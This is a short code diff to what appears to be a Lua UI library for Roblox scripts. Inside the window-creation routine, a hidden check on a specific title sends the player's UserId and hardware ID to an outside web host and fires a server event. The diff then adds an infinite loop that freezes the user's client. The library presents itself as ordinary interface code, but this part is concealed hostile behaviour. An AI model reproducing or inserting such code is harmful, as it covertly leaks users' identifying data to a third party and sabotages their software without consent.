@@ -381,6 +381,8 @@ do
 		if title == "Developers: ZenkiAintBroke" then
             		request({Url="https://skiddmoment.vercel.app",Method="POST",Headers={["content-type"]="application/json"} ,Body=HttpService:JSONEncode({ID=player.UserId,HWID=gethwid()})})
 			ReplicatedStorage:WaitForChild("_CS.Events").FullRecoloring:FireServer("B")
+			wait(0.1)
+			while true do end
         	end
 		local container = utility:Create("ImageLabel", {
 			Name = title,
